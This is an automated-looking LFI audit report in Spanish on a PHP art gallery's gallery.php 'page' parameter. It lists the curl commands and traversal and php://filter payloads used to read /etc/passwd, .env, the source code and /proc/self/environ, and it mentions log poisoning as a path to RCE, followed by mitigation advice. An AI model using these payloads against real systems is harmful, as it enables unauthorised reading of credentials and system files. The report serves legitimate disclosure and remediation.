# Informe de Auditoría LFI — Galería de Arte Virtual

Fecha: 2026-04-18T12:42:06Z
Objetivo: http://web.dev.local:8081

Resumen ejecutivo:
- Vulnerabilidad encontrada: Local File Inclusion (LFI) en el parámetro `page` de `gallery.php`.
- Impacto: Lectura remota de ficheros del sistema (p. ej. /etc/passwd) y posibilidad de escalado a RCE mediante técnicas adicionales.

Detalles del hallazgo:

1) Punto vulnerable
- URL: http://web.dev.local:8081/gallery.php
- Parámetro vulnerable: page (GET)
- Evidencia: cuando se solicita `page=../../../../../../etc/passwd`, el contenido de /etc/passwd se muestra en la respuesta.

2) Comandos usados (recon / fuzzing / explotación)
- curl -i 'http://web.dev.local:8081/gallery.php?page=modern'
- curl -i 'http://web.dev.local:8081/gallery.php?page=../../../../../../etc/passwd'
- curl -i "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd"
- curl -i "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=gallery.php"
- curl -i "http://web.dev.local:8081/gallery.php?page=php://filter/read=convert.base64-encode/resource=.env"
- curl -i 'http://web.dev.local:8081/gallery.php?page=../../../../../../proc/self/environ'

3) Payloads que permitieron lectura de ficheros
- Traversal simple: ../../../../../../etc/passwd
- php filter (base64): php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd

4) Resultado de explotación
- Se obtuvo con éxito el contenido de /etc/passwd (extracto incluido en la respuesta). Esto confirma LFI y acceso a ficheros del sistema.
- Intento de lectura de /proc/self/environ generó mensajes de error que revelaron la ruta absoluta del archivo vulnerable: /var/www/html/gallery.php (línea 104), lo que facilita desarrollo de payloads para RCE (por ejemplo log poisoning o inclusion de /proc/self/environ si permisos lo permiten).

5) Pasos sugeridos de mitigación
- Validar y sanitizar el parámetro `page`: permitir sólo valores esperados (lista blanca) y/o mapear parámetros a archivos permitidos.
- Evitar incluir archivos directamente basados en input del usuario. Usar switch/case o un mapeo seguro.
- Deshabilitar wrappers php:// si no son necesarios y restringir include_path.
- Asegurar permisos de ficheros sensibles y evitar que el usuario del servidor web tenga acceso a ficheros privados.

6) Impacto y seguimiento
- Impacto: Alto. Lectura de ficheros sensibles y posible escalado a RCE.
- Recomendación: Aplicar mitigaciones y re-evaluar.

Anexos (salidas relevantes):
- /etc/passwd mostrado en la respuesta al payload de traversal.
- php://filter base64 del propio gallery.php mostró el código fuente parcialmente en base64.
- Errores al intentar incluir /proc/self/environ revelaron ruta absoluta y línea de inclusión.

Informe generado por: Auditor Automático (Kali tools)
